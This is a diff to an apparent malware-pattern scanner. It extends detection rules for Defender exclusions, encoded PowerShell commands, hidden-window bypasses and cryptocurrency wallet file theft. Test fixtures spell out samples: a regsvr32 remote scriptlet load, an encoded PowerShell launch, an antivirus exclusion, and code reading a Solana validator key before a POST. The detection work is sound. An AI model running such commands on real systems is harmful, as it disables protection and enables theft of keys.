@@ -120,7 +120,7 @@ _TAMPER = [
             "-Mp",
             r"Preference\b[^\n]*-Disable\w*(?::\s*\$true|:\s*1\b|(?!\s+\$false)(?:\s+\$true|\s+1\b|\s*$|\s+`))",
         ),
-        ("Add", "-Mp", r"Preference\b[^\n]*-Exclusion"),
+        (r"(?:Add|Set)", "-Mp", r"Preference\b[^\n]*-Exclusion"),
     )
 ]
 _HIDDEN = _J((r"-Window", r"Style\s+", "Hidden"))
@@ -255,7 +255,7 @@ def _check_hidden_bypass(path, lines, text):
         re.compile(_BYPASS, re.I),
         re.compile(_BYPASS_ARRAY, re.I),
     )
-    hidden_array = re.compile(r"(?i)['\"]-WindowStyle['\"]\s*,\s*['\"]Hidden['\"]|['\"]Hidden['\"]")
+    hidden_array = re.compile(r"(?i)['\"]-WindowStyle['\"]\s*,\s*['\"]Hidden['\"]")
     out = []
     for i, line in enumerate(lines):
         if not (hidden.search(line) or hidden_array.search(line)):
@@ -459,7 +459,7 @@ RULES = [
         applies = lambda p: p.endswith(LAUNCHERS),
         line_patterns = [
             r"(?i)" + _ENC_CMD + r"\b",
-            r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]*\s-e(?:c|nc|ncodedcommand)?[\s:]+['\"]?[A-Za-z0-9+/=]{16,}",
+            r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]*\s-(?:ec|e(?:n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:nd?)?)?)?)?)?)?)?)?)?)?)?)?)[\s:]+['\"]?[A-Za-z0-9+/=]{16,}",
             _FROM_B64,
             r"(?i)\bbase64\s+(?:-d|--decode)\b[^\n]*\|",
         ],
@@ -525,6 +525,8 @@ RULES = [
                 ("id_", "ecdsa"),
                 (".bit", "coin"),
                 (".ethe", "reum"),
+                (".sol", "ana"),
+                (".mon", "ero"),
             )
         ),
         check = _check_credentials,
@@ -1030,6 +1032,28 @@ def _fixtures() -> list[tuple[str, str, str, bool]]:
             "AV011",
             "t.bat",
             "regsvr32 /s /i:" + q + "https://example.invalid/a.sct" + q + " scrobj.dll",
+            True,
+        ),
+        ("AV004", "t.ps1", "powershell.exe -en " + q + "ZQBjAGgAbwAgAGgAaQA=" + q, True),
+        (
+            "AV006",
+            "t.ps1",
+            _J(("Set", "-Mp", "Preference")) + " -Exclusion" + "Path C:\\work",
+            True,
+        ),
+        (
+            "AV007",
+            "t.ps1",
+            "$visibility = 'Hidden'\npowershell -ExecutionPolicy "
+            + _J(("By", "pass"))
+            + " -File a.ps1",
+            False,
+        ),
+        (
+            "AV008",
+            "s.py",
+            "import os, requests\nk = os.environ['HOME'] + '/.sol"
+            + "ana/validator_key'\nrequests.post(u)\n",
             True,
         ),
         # Suppression is honoured outside the shipped installers and ignored inside them.
